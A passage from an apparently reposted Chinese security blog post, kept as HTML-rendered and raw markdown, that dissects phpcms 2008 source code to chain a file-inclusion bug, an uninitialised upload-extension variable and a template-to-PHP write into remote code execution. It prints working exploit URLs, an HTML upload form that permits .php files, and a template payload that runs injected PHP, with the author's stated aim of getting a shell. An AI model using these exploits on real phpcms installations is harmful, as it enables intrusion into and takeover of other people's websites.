class=\"string\">'您所在的会员组没有此项操作权限'</span>;</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'description'</span>] = <span class=\"string\">'你可以做下面操作'</span>;</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'urls'</span>][<span class=\"number\">0</span>] = <span class=\"keyword\">array</span>(</div><div class=\"line\"> <span class=\"string\">'name'</span>=&gt;<span class=\"string\">'升级会员组'</span>,</div><div class=\"line\"> <span class=\"string\">'url'</span>=&gt;<span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'siteurl'</span>].<span class=\"string\">'member/upgrade.php'</span>,</div><div class=\"line\"> );</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'urls'</span>][<span class=\"number\">1</span>] = <span class=\"keyword\">array</span>(</div><div class=\"line\"> <span class=\"string\">'name'</span>=&gt;<span class=\"string\">'返回商务中心'</span>,</div><div class=\"line\"> <span class=\"string\">'url'</span>=&gt;<span class=\"string\">'?'</span>,</div><div class=\"line\"> );</div><div class=\"line\"> msg(<span class=\"variable\">$MS</span>);</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<h2 id=\"利用注册一个企业用户\">利用注册一个企业用户</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">EXP:http:<span class=\"comment\">//localhost/phpcms/yp/business/?file=../../xxoo.txt%00.</span></div></pre></td></tr></table></figure>\n\n<p>由于涉及截断，所以鸡肋了，哥是要去拿shell的。</p>\n<h2 id=\"再看这一句\">再看这一句</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(!@<span class=\"keyword\">include</span> ADMIN_ROOT.<span class=\"variable\">$file</span>.<span class=\"string\">'.inc.php'</span>) </div><div class=\"line\">showmessage(<span class=\"string\">'The file ./yp/'</span>.<span class=\"variable\">$file</span>.<span class=\"string\">'.inc.php is not exists!'</span>);</div></pre></td></tr></table></figure>\n\n<p>以.inc.php结尾的文件有大把随便找个有漏的文件包含进来，不就能二次利用了？</p>\n<h2 id=\"首先进入视线的是/admin/upload-inc-php\">首先进入视线的是/admin/upload.inc.php</h2>\n<p>看名字就知道如果能利用的话，将会…..(省略500字)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">defined(<span class=\"string\">'IN_PHPCMS'</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">exit</span>(<span class=\"string\">'Access Denied'</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">'attachment.class.php'</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"variable\">$attachment</span> = <span class=\"keyword\">new</span> attachment(<span class=\"variable\">$mod</span>);</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$catid</span>)</div><div class=\"line\">{</div><div class=\"line\"> <span class=\"variable\">$C</span> = cache_read(<span class=\"string\">'category_'</span>.<span class=\"variable\">$catid</span>.<span class=\"string\">'.php'</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">## 允许上传的后缀是从$C里取的，变量$C要通过上面那个判断才能赋值，典型的变量未初始化</span></div><div class=\"line\"><span class=\"variable\">$upload_allowext</span> = <span class=\"variable\">$C</span>[<span class=\"string\">'upload_allowext'</span>] ? <span class=\"variable\">$C</span>[<span class=\"string\">'upload_allowext'</span>] : </div><div class=\"line\">UPLOAD_ALLOWEXT;</div><div class=\"line\"><span class=\"variable\">$upload_maxsize</span> = <span class=\"variable\">$C</span>[<span class=\"string\">'upload_maxsize'</span>] ? <span class=\"variable\">$C</span>[<span class=\"string\">'upload_maxsize'</span>] : </div><div class=\"line\">UPLOAD_MAXSIZE;</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$dosubmit</span>)</div><div class=\"line\">{</div><div class=\"line\"> <span class=\"variable\">$attachment</span>-&gt;upload(<span class=\"string\">'uploadfile'</span>, <span class=\"variable\">$upload_allowext</span>, <span class=\"variable\">$upload_maxsize</span>, <span class=\"number\">1</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$attachment</span>-&gt;error) showmessage(<span class=\"variable\">$attachment</span>-&gt;error());</div><div class=\"line\"> <span class=\"comment\">//判断是否开启附件ftp上传，返回图片路径</span></div><div class=\"line\"> <span class=\"variable\">$imgurl</span> = UPLOAD_FTP_ENABLE ? <span class=\"variable\">$attachment</span>-&gt;uploadedfiles[<span class=\"number\">0</span>][<span class=\"string\">'filepath'</span>] : </div><div class=\"line\">UPLOAD_URL.<span class=\"variable\">$attachment</span>-&gt;uploadedfiles[<span class=\"number\">0</span>][<span class=\"string\">'filepath'</span>];</div><div class=\"line\"> <span class=\"variable\">$aid</span> = <span class=\"variable\">$attachment</span>-&gt;uploadedfiles[<span class=\"number\">0</span>][<span class=\"string\">'aid'</span>];</div><div class=\"line\"> <span class=\"variable\">$filesize</span> = <span class=\"variable\">$attachment</span>-&gt;uploadedfiles[<span class=\"number\">0</span>][<span class=\"string\">'filesize'</span>];</div><div class=\"line\"> <span class=\"variable\">$filesize</span> = <span class=\"variable\">$attachment</span>-&gt;size(<span class=\"variable\">$filesize</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$isthumb</span> || <span class=\"variable\">$iswatermark</span>)</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"keyword\">require_once</span> <span class=\"string\">'image.class.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$image</span> = <span class=\"keyword\">new</span> image();</div><div class=\"line\"> <span class=\"variable\">$img</span> = UPLOAD_ROOT.<span class=\"variable\">$attachment</span>-&gt;uploadedfiles[<span class=\"number\">0</span>][<span class=\"string\">'filepath'</span>];</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$isthumb</span>)</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"variable\">$image</span>-&gt;thumb(<span class=\"variable\">$img</span>, <span class=\"variable\">$img</span>, <span class=\"variable\">$width</span>, <span class=\"variable\">$height</span>);</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$iswatermark</span>)</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"variable\">$image</span>-&gt;watermark(<span class=\"variable\">$img</span>, <span class=\"variable\">$img</span>, <span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'watermark_pos'</span>], </div><div class=\"line\"><span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'watermark_img'</span>], <span class=\"string\">''</span>, <span class=\"number\">5</span>, <span class=\"string\">'#ff0000'</span>, <span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'watermark_jpgquality'</span>]);</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\"></div><div class=\"line\">showmessage(&quot;文件上传成功！&lt;script language=<span class=\"string\">'javascript'</span>&gt; </div><div class=\"line\"><span class=\"keyword\">try</span>{ $(window.opener.document).find(&quot;form[@name=<span class=\"string\">'myform'</span>] <span class=\"comment\">#$uploadtext&quot;).</span></div><div class=\"line\">val(&quot;<span class=\"variable\">$imgurl</span>&quot;);$(window.opener.document).find(&quot;form[@name=<span class=\"string\">'myform'</span>] </div><div class=\"line\"><span class=\"comment\">#{$uploadtext}_aid&quot;).val(&quot;$aid&quot;);$(window.opener.document).</span></div><div class=\"line\">find(&quot;form[@name=<span class=\"string\">'myform'</span>] <span class=\"comment\">#$filesize&quot;).val(&quot;$filesize&quot;);}catch(e){}</span></div><div class=\"line\"> window.close();&lt;/script&gt;&quot;, HTTP_REFERER);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\">{</div><div class=\"line\"> <span class=\"keyword\">include</span> admin_tpl(<span class=\"string\">'upload'</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<h2 id=\"没什么好说的看EXP,_上传后查看网页源代码即可找到上传路径-\">没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.</h2>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">form</span> <span class=\"attribute\">id</span>=<span class=\"value\">&quot;frmUpload&quot;</span> <span class=\"attribute\">enctype</span>=<span class=\"value\">&quot;multipart</span>/<span class=\"attribute\">form-data</span>&<span class=\"attribute\">quot</span>;</span></div><div class=\"line\"><span class=\"attribute\">action</span>=<span class=\"value\">&quot;http:</span>//<span class=\"attribute\">localhost</span>/<span class=\"attribute\">phpcms</span>/<span class=\"attribute\">yp</span>/<span class=\"attribute\">business</span>/?<span class=\"attribute\">file</span>=</div><div class=\"line\"><span class=\"attribute\">..</span>/<span class=\"attribute\">..</span>/<span class=\"attribute\">admin</span>/<span class=\"attribute\">upload</span>&<span class=\"attribute\">amp</span>;<span class=\"attribute\">C</span>[<span class=\"attribute\">upload_allowext</span>]=<span class=\"value\">php|Php%00.|php%00&amp;dosubmit=yes&quot;</span> </div><div class=\"line\"><span class=\"attribute\">method</span>=<span class=\"value\">\"post\"</span>&gt;;</div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">h1</span>&gt;</span>Upload a new file:<span class=\"tag\">&lt;/<span class=\"title\">h1</span>&gt;</span></div><div class=\"line\">&lt;input type=&quot;file&quot; name=&quot;uploadfile&quot; size=&quot;50&quot;&gt;&lt;br&gt;</div><div class=\"line\">&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</div><div class=\"line\">&lt;/form&gt;</div></pre></td></tr></table></figure>\n\n<h2 id=\"传完后我才发现attachment-class-php_里有黑名单，怎么绕大家结合环境利用吧。\">传完后我才发现attachment.class.php 里有黑名单，怎么绕大家结合环境利用吧。</h2>\n<h2 id=\"漏洞再一次被鸡肋化了，哥继续找。_再次进入视线的是block-inc-php，\">漏洞再一次被鸡肋化了，哥继续找。 再次进入视线的是block.inc.php，</h2>\n<p>看名字貌似是跟模块有关的，难不成可以写个shell ?</p>\n<h2 id=\"猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。\">猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。</h2>\n<h2 id=\"看144行左右，当$action_等于_post时。\">看144行左右，当$action 等于 post时。</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">'post'</span>:</div><div class=\"line\"> <span class=\"keyword\">require_once</span> <span class=\"string\">'template.func.php'</span>;</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$func</span> == <span class=\"string\">'dosave'</span>) <span class=\"comment\">## 这里完全不用管他，让他进入else</span></div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"variable\">$block</span>-&gt;set_template(<span class=\"variable\">$blockid</span>, <span class=\"variable\">$template</span>);</div><div class=\"line\"> <span class=\"variable\">$block</span>-&gt;update(<span class=\"variable\">$blockid</span>, <span class=\"variable\">$data</span>);</div><div class=\"line\"> <span class=\"variable\">$data</span> = <span class=\"variable\">$block</span>-&gt;get_html(<span class=\"variable\">$blockid</span>);</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"keyword\">else</span></div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"variable\">$name</span> = new_stripslashes(<span class=\"variable\">$name</span>);</div><div class=\"line\"> <span class=\"variable\">$data</span> = new_stripslashes(<span class=\"variable\">$data</span>);</div><div class=\"line\"> <span class=\"variable\">$data</span> = <span class=\"variable\">$block</span>-&gt;strip_data(<span class=\"variable\">$data</span>);</div><div class=\"line\"> <span class=\"variable\">$template</span> = new_stripslashes(<span class=\"variable\">$template</span>);</div><div class=\"line\"> <span class=\"variable\">$tpldata</span> = template_parse(<span class=\"variable\">$template</span>);</div><div class=\"line\"> <span class=\"variable\">$tplfile</span> = TPL_CACHEPATH.<span class=\"string\">'block_'</span>.<span class=\"variable\">$blockid</span>.<span class=\"string\">'.preview.php'</span>; <span class=\"comment\">## 文件名</span></div><div class=\"line\"> file_put_contents(<span class=\"variable\">$tplfile</span>, <span class=\"variable\">$tpldata</span>); <span class=\"comment\">## 生成文件</span></div><div class=\"line\"> <span class=\"keyword\">include</span> <span class=\"variable\">$tplfile</span>; <span class=\"comment\">## 包含文件</span></div><div class=\"line\"> @unlink(<span class=\"variable\">$tplfile</span>); <span class=\"comment\">## 删除刚才生成的文件</span></div><div class=\"line\"> <span class=\"variable\">$data</span> = ob_get_contents();</div><div class=\"line\"> ob_clean();</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;script language=&quot;JavaScript&quot;&gt;parent.'</span>.<span class=\"variable\">$func</span>.<span class=\"string\">'('</span>.<span class=\"variable\">$blockid</span>.<span class=\"string\">',</span></div><div class=\"line\"> &quot;'.format_js(<span class=\"variable\">$data</span>, <span class=\"number\">0</span>).<span class=\"string\">'&quot;);&lt;/script&gt;'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div></pre></td></tr></table></figure>\n\n<h2 id=\"在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，\">在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，</h2>\n<h1 id=\"只要能控制php文件的内容，代码还是会被执行。\">只要能控制php文件的内容，代码还是会被执行。</h1>\n<h2 id=\"看取得文件内容的这一行，$tpldata_=_template_parse($template);\">看取得文件内容的这一行，$tpldata = template_parse($template);</h2>\n<h1 id=\"跟进template_parse函数\">跟进template_parse函数</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">template_parse</span><span class=\"params\">(<span class=\"variable\">$str</span>, <span class=\"variable\">$istag</span> = <span class=\"number\">0</span>)</span></span></div><div class=\"line\">{</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/([nr]+)t+/s&quot;,&quot;<span class=\"number\">1</span>&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/&lt;!--{(.+?)}--&gt;/s&quot;,</div><div class=\"line\"> &quot;{<span class=\"number\">1</span>}&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{templates+(.+)}/&quot;,</div><div class=\"line\">&quot;&lt;?php <span class=\"keyword\">include</span> template(<span class=\"number\">1</span>); ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{includes+(.+)}/&quot;,</div><div class=\"line\">&quot;&lt;?php <span class=\"keyword\">include</span> <span class=\"number\">1</span>; ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{phps+(.+)}/&quot;,</div><div class=\"line\">&quot;&lt;?php <span class=\"number\">1</span>?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{ifs+(.+?)}/&quot;,</div><div class=\"line\">&quot;&lt;?php <span class=\"keyword\">if</span>(<span class=\"number\">1</span>) { ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{<span class=\"keyword\">else</span>}/&quot;,&quot;&lt;?php } <span class=\"keyword\">else</span> { ?&gt;&quot;</div><div class=\"line\">,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{elseifs+(.+?)}/&quot;,&quot;&lt;?php } <span class=\"keyword\">elseif</span> (<span class=\"number\">1</span>) { ?&gt;&quot;,</div><div class=\"line\"><span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{/<span class=\"keyword\">if</span>}/&quot;,&quot;&lt;?php } ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{loops+(S+)s+(S+)}/&quot;,&quot;&lt;?php </div><div class=\"line\"><span class=\"keyword\">if</span>(is_array(<span class=\"number\">1</span>))<span class=\"keyword\">foreach</span>(<span class=\"number\">1</span> <span class=\"keyword\">AS</span> <span class=\"number\">2</span>) { ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{loops+(S+)s+(S+)s+(S+)}/&quot;,&quot;&lt;?php </div><div class=\"line\"><span class=\"keyword\">if</span>(is_array(<span class=\"number\">1</span>)) <span class=\"keyword\">foreach</span>(<span class=\"number\">1</span> <span class=\"keyword\">AS</span> <span class=\"number\">2</span> =&gt; <span class=\"number\">3</span>) { ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{/loop}/&quot;,&quot;&lt;?php } ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{/get}/&quot;,&quot;&lt;?php } <span class=\"keyword\">unset</span>(<span class=\"variable\">$DATA</span>); ?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{tag_([^}]+)}/e&quot;, &quot;get_tag(<span class=\"string\">'1'</span>)&quot;, <span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{gets+([^}]+)}/e&quot;, &quot;get_parse(<span class=\"string\">'1'</span>)&quot;, <span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{([a-zA-Z_x7f-xff][a-zA-Z0-<span class=\"number\">9</span>_x7f-xff:]</div><div class=\"line\">*(([^{}]*)))}/&quot;,&quot;&lt;?php <span class=\"keyword\">echo</span> <span class=\"number\">1</span>;?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{$([a-zA-Z_x7f-xff][a-zA-Z0-<span class=\"number\">9</span>_x7f-xff:]</div><div class=\"line\">*(([^{}]*)))}/&quot;,&quot;&lt;?php <span class=\"keyword\">echo</span> <span class=\"number\">1</span>;?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{($[a-zA-Z_x7f-xff][a-zA-Z0-<span class=\"number\">9</span>_x7f-xff]*)}/&quot;,</div><div class=\"line\">&quot;&lt;?php <span class=\"keyword\">echo</span> <span class=\"number\">1</span>;?&gt;&quot;,<span class=\"variable\">$str</span>);</div><div class=\"line\"> <span class=\"variable\">$str</span> = preg_replace(&quot;/{($[a-zA-Z0-<span class=\"number\">9</span>_[]<span class=\"string\">'&quot;$x7f-xff]+)}/es&quot;,</span></div><div class=\"line\"> &quot;addquote('&lt;?php <span class=\"keyword\">echo</span> <span class=\"number\">1</span>;?&gt;<span class=\"string\">')&quot;,$str);</span></div><div class=\"line\"> $str = preg_replace(&quot;/{([A-Z_x7f-xff][A-Z0-9_x7f-xff]*)}/s&quot;,</div><div class=\"line\"> &quot;&lt;?php echo 1;?&gt;&quot;,$str);</div><div class=\"line\"> if(!$istag) $str = &quot;&lt;?php defined('IN_PHPCMS<span class=\"string\">') or exit('</span>Access Denied<span class=\"string\">');</span></div><div class=\"line\"> ?&gt;&quot;.$str;</div><div class=\"line\"> return $str;</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<h2 id=\"是用来处理一些模板语法，完全不用理会。\">是用来处理一些模板语法，完全不用理会。</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"type\">EXP</span>:http://localhost/yp/business/?file=../../</div><div class=\"line\">admin/<span class=\"keyword\">block</span>&amp;action=post&amp;blockid=eval&amp;<span class=\"keyword\">template</span>=&lt;?php phpinfo();exit();?&gt;</div></pre></td></tr></table></figure>\n\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg\" alt=\"\" title=\"phpcms2008\"></a></p>\n<p>其实我觉得之前的那个注入漏洞比较严重~</p>\n","source":"_posts/phpcms-2008多个漏洞-可getshell.md","raw":"title: \"phpcms 2008多个漏洞 (可getshell)\"\nid: 148\ndate: 2012-07-19 23:58:57\ntags: \n- phpcsm2008漏洞\ncategories: \n- 技术文章\n- 最新漏洞\n---\n\n本文转自乌云：http://www.wooyun.org/bugs/wooyun-2010-09563\n[php]\n###文件包含\n\n```php\n<?php\ndefine('IN_YP', TRUE);\ndefine('ADMIN_ROOT', str_replace(&quot;&quot;, '/',dirname(__FILE__)).'/');\nrequire '../include/common.inc.php';\n```\n\n## 要登陆\n\n```php\nif(!$_userid) showmessage('您还没有登陆，即将跳转到登陆页面',\n$MODULE['member']['url'].'login.php?forward='.urlencode(URL));\nsession_start();\n```\n## $file变量可控制\n```php\nif(!isset($file) || empty($file)) $file = 'panel';\n\n/* $company_user_infos 获取企业会员信息 */\n$company_user_infos = $db-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;member_company` \nWHERE `userid`='$_userid'&quot;);\n$userid = $_userid;\n```\n<!--more-->\n\n## 注册的时候选择企业用户\n\n```php\nif(!$company_user_infos)\n{\n $MS['title'] = '您不是企业会员';\n $MS['description'] = '你可以做下面操作';\n $MS['urls'][0] = array(\n 'name'=&gt;'免费升级为企业会员',\n 'url'=&gt;$PHPCMS['siteurl'].$M['url'].'company.php?action=member',\n );\n $MS['urls'][1] = array(\n 'name'=&gt;'退出当前帐号，换其他帐号登陆',\n 'url'=&gt;$PHPCMS['siteurl'].'member/logout.php',\n );\n $MS['urls'][2] = array(\n 'name'=&gt;'重新注册为企业会员',\n 'url'=&gt;$PHPCMS['siteurl'].'member/logout.php?forward='.\nurlencode($PHPCMS['siteurl'].'member/register.php'),\n );\n msg($MS);\n}\n$CATEGORY = subcat('yp');\n$siteurl = company_url($userid, $company_user_infos['sitedomain']);\n\n$_SESSION['url'] = QUERY_STRING;\n\nif($file != 'company' &amp;&amp; $M['enableSecondDomain'] &amp;&amp;\n !$company_user_infos['sitedomain']) \nshowmessage('请先绑定您的二级域名',BUSINESSDIR.'?file=company');\n\ncheck_priv($file);\n$GROUP = cache_read('member_group.php');\n\n## 此处直接包含了，注意$file是可以控制的但须要截断\nif(!@include ADMIN_ROOT.$file.'.inc.php') \nshowmessage('The file ./yp/'.$file.'.inc.php is not exists!');\n\nfunction check_priv($file)\n{\n global $M,$PHPCMS,$_groupid;\n if(!$M[&quot;allow_add_$file&quot;]) return true;\n if(!in_array($_groupid,$M[&quot;allow_add_$file&quot;]))\n {\n $MS['title'] = '您所在的会员组没有此项操作权限';\n $MS['description'] = '你可以做下面操作';\n $MS['urls'][0] = array(\n 'name'=&gt;'升级会员组',\n 'url'=&gt;$PHPCMS['siteurl'].'member/upgrade.php',\n );\n $MS['urls'][1] = array(\n 'name'=&gt;'返回商务中心',\n 'url'=&gt;'?',\n );\n msg($MS);\n }\n}\n?>\n```\n\n## 利用注册一个企业用户\n\n```php\nEXP:http://localhost/phpcms/yp/business/?file=../../xxoo.txt%00.\n```\n由于涉及截断，所以鸡肋了，哥是要去拿shell的。\n## 再看这一句\n\n```php\nif(!@include ADMIN_ROOT.$file.'.inc.php') \nshowmessage('The file ./yp/'.$file.'.inc.php is not exists!');\n```\n以.inc.php结尾的文件有大把随便找个有漏的文件包含进来，不就能二次利用了？\n\n\n## 首先进入视线的是/admin/upload.inc.php \n看名字就知道如果能利用的话，将会.....(省略500字)\n\n```php\n<?php\ndefined('IN_PHPCMS') or exit('Access Denied');\n\nrequire_once 'attachment.class.php';\n\n$attachment = new attachment($mod);\nif($catid)\n{\n $C = cache_read('category_'.$catid.'.php');\n}\n## 允许上传的后缀是从$C里取的，变量$C要通过上面那个判断才能赋值，典型的变量未初始化\n$upload_allowext = $C['upload_allowext'] ? $C['upload_allowext'] : \nUPLOAD_ALLOWEXT;\n$upload_maxsize = $C['upload_maxsize'] ? $C['upload_maxsize'] : \nUPLOAD_MAXSIZE;\nif($dosubmit)\n{\n $attachment-&gt;upload('uploadfile', $upload_allowext, $upload_maxsize, 1);\n if($attachment-&gt;error) showmessage($attachment-&gt;error());\n //判断是否开启附件ftp上传，返回图片路径\n $imgurl = UPLOAD_FTP_ENABLE ? $attachment-&gt;uploadedfiles[0]['filepath'] : \nUPLOAD_URL.$attachment-&gt;uploadedfiles[0]['filepath'];\n $aid = $attachment-&gt;uploadedfiles[0]['aid'];\n $filesize = $attachment-&gt;uploadedfiles[0]['filesize'];\n $filesize = $attachment-&gt;size($filesize);\n if($isthumb || $iswatermark)\n {\n require_once 'image.class.php';\n $image = new image();\n $img = UPLOAD_ROOT.$attachment-&gt;uploadedfiles[0]['filepath'];\n if($isthumb)\n {\n $image-&gt;thumb($img, $img, $width, $height);\n }\n if($iswatermark)\n {\n $image-&gt;watermark($img, $img, $PHPCMS['watermark_pos'], \n$PHPCMS['watermark_img'], '', 5, '#ff0000', $PHPCMS['watermark_jpgquality']);\n }\n }\n\nshowmessage(&quot;文件上传成功！&lt;script language='javascript'&gt; \ntry{ $(window.opener.document).find(&quot;form[@name='myform'] #$uploadtext&quot;).\nval(&quot;$imgurl&quot;);$(window.opener.document).find(&quot;form[@name='myform'] \n#{$uploadtext}_aid&quot;).val(&quot;$aid&quot;);$(window.opener.document).\nfind(&quot;form[@name='myform'] #$filesize&quot;).val(&quot;$filesize&quot;);}catch(e){}\n window.close();&lt;/script&gt;&quot;, HTTP_REFERER);\n}\nelse\n{\n include admin_tpl('upload');\n}\n?>\n```\n\n## 没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.\n```html\n<form id=&quot;frmUpload&quot; 